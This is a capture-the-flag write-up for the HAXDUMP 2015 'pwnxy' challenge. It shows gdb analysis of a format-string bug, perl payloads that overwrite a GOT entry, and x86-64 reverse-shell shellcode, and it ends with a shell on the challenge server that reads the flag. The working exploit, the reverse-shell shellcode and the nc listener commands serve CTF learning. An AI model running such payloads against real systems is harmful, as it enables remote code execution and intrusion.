## HAXDUMP 2015 - pwnxy (Pwn 300)
##### 07/02/2015 (8hr)
___

### Description: 
We provided you with a free proxy so you can escape the NSA!
nc pwnxy.haxdump.com 1337
___
### Soluction

(NOTE: if you want to execute the perl commands, remove the backslashes and run that command as
	one line. Otherwise you may not get the right output) 

Ok let's start. What program does? It accepts a string in the form: GET http://somehost.com
and makes an HTTP GET request (GET /\n) on that server. Then it prints the response page.

Load the program in gdb. The interesting part starts getpage():
   ``` 0x00000000004012c7 <+643>:	callq  0x400c66 <getpage> ```

```assembly
(gdb) disas getpage
Dump of assembler code for function getpage:
   0x0000000000400c66 <+0>:		push   %rbp
   0x0000000000400c67 <+1>:		mov    %rsp,%rbp
   [..... TRUNCATED FOR BREVITY .....]
   0x0000000000400fc9 <+867>:	lea    -0x240(%rbp),%rsi		; buf
   0x0000000000400fd0 <+874>:	mov    -0x14(%rbp),%eax			; that's socket descriptor
   0x0000000000400fd3 <+877>:	mov    $0x0,%ecx				; flags
   0x0000000000400fd8 <+882>:	mov    $0x200,%edx				; len
   0x0000000000400fdd <+887>:	mov    %eax,%edi				;
   0x0000000000400fdf <+889>:	callq  0x4009d0 <recv@plt>		; 
   0x0000000000400fe4 <+894>:	mov    %eax,-0x48(%rbp)			; v48 = recv(v14, v240, 512, 0)
   0x0000000000400fe7 <+897>:	cmpl   $0xffffffff,-0x48(%rbp)	; error?
   0x0000000000400feb <+901>:	jne    0x400ffe <getpage+920>	;
   0x0000000000400fed <+903>:	mov    $0x4013eb,%edi			;
   0x0000000000400ff2 <+908>:	callq  0x400ae0 <perror@plt>	;
   0x0000000000400ff7 <+913>:	mov    $0x4,%eax				;
   0x0000000000400ffc <+918>:	jmp    0x40103a <getpage+980>	;
   ; ------------------------------------------------------------
   0x0000000000400ffe <+920>:	mov    -0x48(%rbp),%eax			;
   0x0000000000401001 <+923>:	mov    %eax,%esi				;
   0x0000000000401003 <+925>:	mov    $0x4013f0,%edi			; "<!-- %d bytes recieved -->\n"
   0x0000000000401008 <+930>:	mov    $0x0,%eax				;
   0x000000000040100d <+935>:	callq  0x400a30 <printf@plt>	; printf($edi, v48) 
   0x0000000000401012 <+940>:	lea    -0x240(%rbp),%rax		;
   0x0000000000401019 <+947>:	mov    %rax,%rdi				;
   0x000000000040101c <+950>:	mov    $0x0,%eax				;
   0x0000000000401021 <+955>:	callq  0x400a30 <printf@plt>	; printf(v240): format string!
   0x0000000000401026 <+960>:	mov    -0x14(%rbp),%eax			;
   0x0000000000401029 <+963>:	mov    %eax,%edi				;
   0x000000000040102b <+965>:	mov    $0x0,%eax				;
   0x0000000000401030 <+970>:	callq  0x400a80 <close@plt>		; close socket()
   0x0000000000401035 <+975>:	mov    $0x0,%eax				;
   0x000000000040103a <+980>:	add    $0x2c8,%rsp				;
   0x0000000000401041 <+987>:	pop    %rbx						;
   0x0000000000401042 <+988>:	pop    %rbp						;
   0x0000000000401043 <+989>:	retq   							;
End of assembler dump.
```

Recall how the arguments are passed on callq:
	"%rdi, %rsi, %rdx, %rcx, %r8 and %r9  are the registers in order used to pass parameters to any 
	libc function from assembly. %rdi is used for first parameter. %rsi for 2nd, %rdx for 3rd and 
	so on." 

The code that I omit it just initializes the socket, makes the connection to the server and sends
the GET request. 

We have a format string vulnerability here. Let's try to exploit it:

1. First set up a server:
	perl -e 'print "AAAA%x"."%llu|"x200' | nc -nvvl -p80

2. Connect to vulnerable server:
	echo "GET http://ispo.ddns.net/" | nc -vv pwnxy.haxdump.com 1337

The response that we get back is:
```
<!-- 512 bytes recieved -->
AAAAffffbea0140737351866848|140737348895744|140737354069824|0|21474836486|140737488349840|55834574912|
140737488349328|3328495691197067825|57415898314801|0|0|0|0|140737354111432|6310544|0|1|0|0|0|0|
7792766831638430017|8968193444719392108|7812660670057180197|2701162985046768757|8461256708179979372|
7792771574006556028|8968193444719392108|7812660670057180197|2701162985046768757|8461256708179979372|
7792771574006556028|8968193444719392108|7812660670057180197|2701162985046768757|8461256708179979372|
7792771574006556028|8968193444719392108|7812660670057180197|2701162985046768757|8461256708179979372|
7792771574006556028|8968193444719392108|7812660670057180197|2701162985046768757|8461256708179979372|
7792771574006556028|8968193444719392108|7812660670057180197|2701162985046768757|8461256708179979372|
7792771574006556028|8968193444719392108|7812660670057180197|2701162985046768757|8461256708179979372|
7792771574006556028|8968193444719392108|7812660670057180197|2701162985046768757|8461256708179979372|
7792771574006556028|8968193444719392108|7812660670057180197|2701162985046768757|8461256708179979372|
7792771574006556028|8968193444719392108|7812660670057180197|2701162985046768757|8461256708179979372|
7792771574006556028|8968193444719392108|7812660670057180197|2701162985046768757|8461256708179979372|
7792771574006556028|8968193444719392108|7812660670057180197|2701162985046768757|8461256708179979372|
7792771574006556028|8968193444719392108|7812660670057180197|2701162983232373248|4199320|4155044400|80|
140733193388045|6310544|17039950270|140737351861824|2|140737488350384|4199116|140737488350616|
18374686488125131153|7954592992444052329|Only GET requests!
```
(NOTE: Things fucked up when you use %x instead of %llu to leak an address).
This response is important, but we'll leave it for now.

Buffer starts at address rbp-0x240. Return address is on rbp+0x4. The offset is 0x244 bytes > 0x200. 
This means that we can't directly overflow the return address. But we can use the format string
vulnerability to overwrite the address of close() in GOT with the address of that buffer which
relies our shellcode.

Let's see how we can overwrite the address of close in GOT:
```assembly
(gdb) disas 0x400a80
Dump of assembler code for function close@plt:
   0x0000000000400a80 <+0>:		jmpq   *0x2015f2(%rip)        # 0x602078 <close@got.plt>
   0x0000000000400a86 <+6>:		pushq  $0xc
   0x0000000000400a8b <+11>:	jmpq   0x4009b0
End of assembler dump.

(gdb) x/8xb 0x602078
0x602078 <close@got.plt>:	0x86	0x0a	0x40	0x00	0x00	0x00	0x00	0x00
```
We want to write the address of our shellcode on address 0x602078. Let's assume for now that the 
address of the shellcode is 0x7fffffffdac0:
```assembly
1: x/i $pc
=> 0x401030 <getpage+970>:	callq  0x400a80 <close@pl
(gdb) set *0x602078 = 0xffffdac0
(gdb) set *0x60207c = 0x00007fff
(gdb) x/8xb 0x602078
0x602078 <close@got.plt>:	0xc0	0xda	0xff	0xff	0xff	0x7f	0x00	0x00
(gdb) si
0x00007fffffffdac0 in ?? ()
```
Cool! Let's make the overwrite via the format string. We want the following values (little endian):

	* 0x602078 --> c0
	* 0x602079 --> da
	* 0x60207a --> ff
	* 0x60207b --> ff
	* 0x60207c --> ff
	* 0x60207d --> 7f
	* 0x60207e --> 00
	* 0x60207f --> 00

Create the "core" structure of the format string -we'll use direct parameter access-(don't forget 
that we're in x64):
```
	"A"x8 .                                                               \
	"%000llu%000\$n"."%000llu%000\$n"."%000llu%000\$n"."%000llu%000\$n".  \
	"%000llu%000\$n"."%000llu%000\$n"."%000llu%000\$n"."%000llu%000\$n".  \
	"\x78\x20\x60\x00\x00\x00\x00\x00"."\x79\x20\x60\x00\x00\x00\x00\x00".\
	"\x7a\x20\x60\x00\x00\x00\x00\x00"."\x7b\x20\x60\x00\x00\x00\x00\x00".\
	"\x7c\x20\x60\x00\x00\x00\x00\x00"."\x7d\x20\x60\x00\x00\x00\x00\x00".\
	"\x7e\x20\x60\x00\x00\x00\x00\x00"."\x7f\x20\x60\x00\x00\x00\x00\x00".\
```
NOTE 1: We're using recv() for reading data, so NULL bytes are allowed
NOTE 2: We add some A's at the beginning to find easier where the buffer starts.

Now we must replace the 000 with the right values. But first, we must ensure that we're writing 
data to the right address. So we replace %n with %x (to avoid seg faults), and we're finding the 
right direct parameters (remember to keep the same size of the format string; otherwise you'll 
affect the index of the parameters):
```
	perl -e 'print "A"x8 .                                                \
	"%001\$lluCCCCC"."%002\$lluCCCCC"."%003\$lluCCCCC"."%004\$lluCCCCC".  \
	"%008\$lluCCCCC"."%009\$lluCCCCC"."%010\$lluCCCCC"."%011\$lluCCCCC".  \
    "\x78\x20\x60\x00\x00\x00\x00\x00"."\x79\x20\x60\x00\x00\x00\x00\x00".\
	"\x7a\x20\x60\x00\x00\x00\x00\x00"."\x7b\x20\x60\x00\x00\x00\x00\x00".\
	"\x7c\x20\x60\x00\x00\x00\x00\x00"."\x7d\x20\x60\x00\x00\x00\x00\x00".\
	"\x7e\x20\x60\x00\x00\x00\x00\x00"."\x7f\x20\x60\x00\x00\x00\x00\x00"'
```

```assembly
1: x/i $pc
=> 0x401021 <getpage+955>:	callq  0x400a30 <printf@plt>
(gdb) x/64xg $rsp
	0x7fffffffd9f0:	0x0000000500000006	0x00007fffffffdee0
	0x7fffffffda00:	0x0000000d00000040	0x00007fffffffdce0
	0x7fffffffda10:	0x2e3131322e383231	0x000034382e393831
	0x7fffffffda20:	0x0000000000000000	0x0000000000000000
	0x7fffffffda30:	0x0000000000000000	0x0000000000000000
	0x7fffffffda40:	0x00007ffff7ff99c8	0x00000000006051c0
	0x7fffffffda50:	0x0000000000000000	0x0000000000000001
	0x7fffffffda60:	0x0000000000000000	0x0000000000000000
	0x7fffffffda70:	0x0000000000000000	0x0000000000000000
	0x7fffffffda80:	0x4141414141414141	0x756c6c2431303025
	0x7fffffffda90:	0x3030254343434343	0x434343756c6c2432
	0x7fffffffdaa0:	0x6c24333030254343	0x254343434343756c
	0x7fffffffdab0:	0x43756c6c24343030	0x3830302543434343
	0x7fffffffdac0:	0x43434343756c6c24	0x6c6c243930302543
	0x7fffffffdad0:	0x3025434343434375	0x4343756c6c243031
	0x7fffffffdae0:	0x2431313025434343	0x4343434343756c6c
	0x7fffffffdaf0:	0x0000000000602078	0x0000000000602079
	0x7fffffffdb00:	0x000000000060207a	0x000000000060207b
	0x7fffffffdb10:	0x000000000060207c	0x000000000060207d
	0x7fffffffdb20:	0x000000000060207e	0x000000000060207f
	0x7fffffffdb30:	0x0000000000000000	0x0000000000000000
(gdb) ni
AAAAAAAA140737488335600CCCCC140737351866848CCCCC140737348895744CCCCC140737353955136CCCCC
55834574912CCCCC140737488346336CCCCC3328495691197067825CCCCC57415898314801CCCCCx 
`0x0000000000401026 in getpage ()
```
Ok let's anayse the output:
```
	AAAAAAAA
	140737488335600     CCCCC	--> 0x7fffffffb2f0		--> $1
	140737351866848     CCCCC	--> 0x7ffff7dd59e0		--> $2
	140737348895744     CCCCC	--> 0x7ffff7b00400		--> $3
	140737353955136     CCCCC	--> 0x7ffff7fd3740		--> $4
	55834574912         CCCCC	--> 0xd00000040			--> $8
	140737488346336     CCCCC	--> 0x7fffffffdce0		--> $9 
	3328495691197067825 CCCCC	--> 0x2e3131322e383231	--> $10
	57415898314801      CCCCC	--> 0x34382e393831		--> $11
```
Do you see the arguments?
```
	0x7fffffffda00:	0x0000000d00000040	0x00007fffffffdce0
	0x7fffffffda10:	0x2e3131322e383231	0x000034382e393831
```
So, if $8 returns the value 0x0000000d00000040, then $38 will return the value 0x0000000000602078,
$39 will return the value 0x0000000000602079, and so on.

Update the format string:
```
	perl -e 'print "A"x8 .                                                \
	"%038\$nCCCCCCC"."%039\$nCCCCCCC"."%040\$nCCCCCCC"."%041\$nCCCCCCC".  \
	"%042\$nCCCCCCC"."%043\$nCCCCCCC"."%044\$nCCCCCCC"."%045\$nCCCCCCC".  \
	"\x78\x20\x60\x00\x00\x00\x00\x00"."\x79\x20\x60\x00\x00\x00\x00\x00".\
	"\x7a\x20\x60\x00\x00\x00\x00\x00"."\x7b\x20\x60\x00\x00\x00\x00\x00".\
	"\x7c\x20\x60\x00\x00\x00\x00\x00"."\x7d\x20\x60\x00\x00\x00\x00\x00".\
	"\x7e\x20\x60\x00\x00\x00\x00\x00"."\x7f\x20\x60\x00\x00\x00\x00\x00"'
```
```
=> 0x401012 <getcode+940>:	lea    -0x240(%rbp),%rax
(gdb) x/8xb 0x602078
0x602078 <close@got.plt>:	0x08	0x0f	0x16	0x1d	0x24	0x2b	0x32	0x39
```
Ok, we can overwrite the address in GOT, but we need the right values:
```
	Current: 0x08	0x0f	0x16	0x1d	0x24	0x2b	0x32	0x39
	Goal   : 0xc0	0xda	0xff	0xff	0xff	0x7f	0x00	0x00
```
After a bit we found the correct string:
```
	perl -e 'print "AAA%189x" .											  \
	"%038\$nCC%024x"."%039\$nCC%035x"."%040\$nCC%254x"."%041\$nCC%254x".  \
  	"%042\$nCC%126x"."%043\$nCC%127x"."%044\$nCC%254x"."%045\$nCCCCCCC".  \
	"\x78\x20\x60\x00\x00\x00\x00\x00"."\x79\x20\x60\x00\x00\x00\x00\x00".\
	"\x7a\x20\x60\x00\x00\x00\x00\x00"."\x7b\x20\x60\x00\x00\x00\x00\x00".\
	"\x7c\x20\x60\x00\x00\x00\x00\x00"."\x7d\x20\x60\x00\x00\x00\x00\x00".\
	"\x7e\x20\x60\x00\x00\x00\x00\x00"."\x7f\x20\x60\x00\x00\x00\x00\x00"'
```
```
(gdb) x/8xb 0x602078
0x602078 <close@got.plt>:	0xc0	0xda	0xff	0xff	0xff	0x7f	0x00	0x00
(gdb) cont
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffdac0 in ?? ()
```
Awesome! Let's add the shellcode, AFTER the format string (otherwise the format string will messed
up).
```
	perl -e 'print "AAA%189x" .                                           \
	"%038\$nCC%024x"."%039\$nCC%035x"."%040\$nCC%254x"."%041\$nCC%254x".  \
	"%042\$nCC%126x"."%043\$nCC%127x"."%044\$nCC%254x"."%045\$nCCCCCCC".  \
	"\x78\x20\x60\x00\x00\x00\x00\x00"."\x79\x20\x60\x00\x00\x00\x00\x00".\
	"\x7a\x20\x60\x00\x00\x00\x00\x00"."\x7b\x20\x60\x00\x00\x00\x00\x00".\
	"\x7c\x20\x60\x00\x00\x00\x00\x00"."\x7d\x20\x60\x00\x00\x00\x00\x00".\
	"\x7e\x20\x60\x00\x00\x00\x00\x00"."\x7f\x20\x60\x00\x00\x00\x00\x00".\
	"\x90"x100 .														  \
	"\x31\xf6\xf7\xe6\xff\xc6\x6a\x02\x5f\x04\x29\x0f\x05\x50\x5f\x52\x52\xc7\x44\x24\x04\x80\xd3\xbd\x54\x66\xc7\x44\x24\x02\x11\x5c\xc6\x04\x24\x02\x54\x5e\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x56\x5a\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05".\
	"A"x40'
```
```
(gdb) x/64xg $rsp
	0x7fffffffd9f0:	0x0000000500000006	0x00007fffffffdee0
	0x7fffffffda00:	0x0000000d00000040	0x00007fffffffdce0
	0x7fffffffda10:	0x2e3131322e383231	0x000034382e393831
	0x7fffffffda20:	0x0000000000000000	0x0000000000000000
	0x7fffffffda30:	0x0000000000000000	0x0000000000000000
	0x7fffffffda40:	0x00007ffff7ff99c8	0x00000000006051c0
	0x7fffffffda50:	0x0000000000000000	0x0000000000000001
	0x7fffffffda60:	0x0000000000000000	0x0000000000000000
	0x7fffffffda70:	0x0000000000000000	0x0000000000000000
	0x7fffffffda80:	0x7839383125414141	0x43436e2438333025
	0x7fffffffda90:	0x3330257834323025	0x33302543436e2439
	0x7fffffffdaa0:	0x6e24303430257835	0x2578343532254343
	0x7fffffffdab0:	0x2543436e24313430	0x3234302578343532
	0x7fffffffdac0:	0x3632312543436e24	0x436e243334302578
	0x7fffffffdad0:	0x3025783732312543	0x322543436e243434
	0x7fffffffdae0:	0x2435343025783435	0x434343434343436e
	0x7fffffffdaf0:	0x0000000000602078	0x0000000000602079
	0x7fffffffdb00:	0x000000000060207a	0x000000000060207b
	0x7fffffffdb10:	0x000000000060207c	0x000000000060207d
	0x7fffffffdb20:	0x000000000060207e	0x000000000060207f
	0x7fffffffdb30:	0x9090909090909090	0x9090909090909090
	0x7fffffffdb40:	0x9090909090909090	0x9090909090909090
```
The nop sled starts from 0x7fffffffdb30. Let's say that the goal address is: 0x7fffffffdb40.
Adjust the values on the format string:
```
	Old: 0xc0	0xda	0xff	0xff	0xff	0x7f	0x00	0x00
	New: 0x40	0xdb	0xff	0xff	0xff	0x7f	0x00	0x00
```
```
	perl -e 'print "AAA%061x" .                                           \
	"%038\$nCC%153x"."%039\$nCC%034x"."%040\$nCC%254x"."%041\$nCC%254x".  \
	"%042\$nCC%126x"."%043\$nCC%127x"."%044\$nCC%254x"."%045\$nCCCCCCC".  \
	"\x78\x20\x60\x00\x00\x00\x00\x00"."\x79\x20\x60\x00\x00\x00\x00\x00".\
	"\x7a\x20\x60\x00\x00\x00\x00\x00"."\x7b\x20\x60\x00\x00\x00\x00\x00".\
	"\x7c\x20\x60\x00\x00\x00\x00\x00"."\x7d\x20\x60\x00\x00\x00\x00\x00".\
	"\x7e\x20\x60\x00\x00\x00\x00\x00"."\x7f\x20\x60\x00\x00\x00\x00\x00".\
	"\x90"x100 .                                                          \
	"\x31\xf6\xf7\xe6\xff\xc6\x6a\x02\x5f\x04\x29\x0f\x05\x50\x5f\x52\x52\xc7\x44\x24\x04\x80\xd3\xbd\x54\x66\xc7\x44\x24\x02\x11\x5c\xc6\x04\x24\x02\x54\x5e\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x56\x5a\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05".\
	"A"x40'
```
___
Now it's time for the attack:
```
--------------- TERMINAL 1 ---------------
root@nogirl # perl -e 'print "our_buffer"' | nc -nvvl -p80
	Listening on [0.0.0.0] (family 0, port 80)

(we need root access to listen on port <1024)

--------------- TERMINAL 3 ---------------
ispo@nogirl ~ $ echo "GET http://ispo.ddns.net/"  | ./pwnxy 


--------------- TERMINAL 2 ---------------
ispo@nogirl ~ $ nc -nlvv -p 4444
	Listening on [0.0.0.0] (family 0, port 4444)
	Connection from [128.211.189.84] port 4444 [tcp] accepted (family 2, sport 54061)
	whoami
		ispo
```
___
The exploit works fine locally. Let's make it work remotely. In order to do that we have to leak 
somehow an address from the stack and calculate the address of the shellcode in the remote server.
But wait... we have already leaked an address!
```assembly
Breakpoint 2, 0x0000000000401026 in getpage ()
1: x/i $pc
=> 0x401026 <getpage+960>:	mov    -0x14(%rbp),%eax
(gdb) i r rbp rsp
rbp            0x7fffffffdcc0	0x7fffffffdcc0
rsp            0x7fffffffd9f0	0x7fffffffd9f0
(gdb) x/64xg $rsp
0x7fffffffd9f0:	0x0000000500000006	0x00007fffffffdee0
[..... TRUNCATED FOR BREVITY .....]
0x7fffffffdcc0:	0x00007fffffffe100	0x00000000004012cc
```
0x4012cc is the return address of getpage(). Just before is the stored value of ebp, which is at
address 0x7fffffffdcc0. Remember the output dump that we got at the beginning?
```
	<!-- 512 bytes recieved -->
	AAAAffffbea0140737351866848|140737348895744|140737354069824|0|
	.....
	2701162983232373248|4199320|4155044400|80|140733193388045|6310544|17039950270|140737351861824|2|
	140737488350384|4199116|140737488350616
```
Let's search for the address 0x4012cc (4199116). Just before there's the value: 140737488350384 
(0x7fffffffecb0). Bingo!

	Old ebp in my machine    : 0x00007fffffffe100
	Old ebp in remote machine: 0x00007fffffffecb0

The difference is 0xbb0 = 2992 bytes. If the shellcode (or the nop sled) on my machine starts at 
0x7fffffffdb40, it will start at 0x7fffffffdb40+0xbb0 = 0x7fffffffe6f0 on remote machine (no ASLR).

One more time, let's update the format string to overwrite the new address:
	Old : 0x40	0xdb	0xff	0xff	0xff	0x7f	0x00	0x00
	New : 0xf0	0xe6	0xff	0xff	0xff	0x7f	0x00	0x00
```
	perl -e 'print "AAA%237x" .                                           \
	"%038\$nCC%244x"."%039\$nCC%023x"."%040\$nCC%254x"."%041\$nCC%254x".  \
	"%042\$nCC%126x"."%043\$nCC%127x"."%044\$nCC%254x"."%045\$nCCCCCCC".  \
    "\x78\x20\x60\x00\x00\x00\x00\x00"."\x79\x20\x60\x00\x00\x00\x00\x00".\
	"\x7a\x20\x60\x00\x00\x00\x00\x00"."\x7b\x20\x60\x00\x00\x00\x00\x00".\
	"\x7c\x20\x60\x00\x00\x00\x00\x00"."\x7d\x20\x60\x00\x00\x00\x00\x00".\
	"\x7e\x20\x60\x00\x00\x00\x00\x00"."\x7f\x20\x60\x00\x00\x00\x00\x00".\
	"\x90"x100 .                                                          \
	"\x31\xf6\xf7\xe6\xff\xc6\x6a\x02\x5f\x04\x29\x0f\x05\x50\x5f\x52\x52\xc7\x44\x24\x04\x80\xd3\xbd\x54\x66\xc7\x44\x24\x02\x11\x5c\xc6\x04\x24\x02\x54\x5e\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x56\x5a\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05".\
	"A"x40'
```
Now launch the attack:

___
```
--------------- TERMINAL 1 ---------------
root@nogirl # perl -e 'print "our_buffer"' | nc -nvvl -p80
	Listening on [0.0.0.0] (family 0, port 80)

--------------- TERMINAL 3 ---------------
ispo@nogirl ~ $ echo "GET http://ispo.ddns.net/"  | nc7-vv pwnxy.haxdump.com 1337

--------------- TERMINAL 2 ---------------
ispo@nogirl ~ $ nc -nlvv -p 4444
	Listening on [0.0.0.0] (family 0, port 4444)
	Connection from [54.153.72.141] port 4444 [tcp] accepted (family 2, sport 54847)
	whoami
		pwnxy
	pwd 
		/
	cd home
	ls -l
		total 8
		drwxr-x--- 2 root   pwnxy  4096 Feb  7 19:04 pwnxy
		drwxr-xr-x 4 ubuntu ubuntu 4096 Feb  7 22:59 ubuntu
	cd pwnxy
	s -l
		total 20
		-r--r----- 1 root pwnxy    43 Feb  7 19:04 flag
		-rwxr-xr-x 1 root pwnxy 13975 Feb  7 19:01 pwnxy
	cat flag
		PwN_M3_L1|<3_0n3_0f_Y0u|2_F|23nC|-|_G1|2L5
```

Boom! Ok that's all folks.
Bye Bye :)
___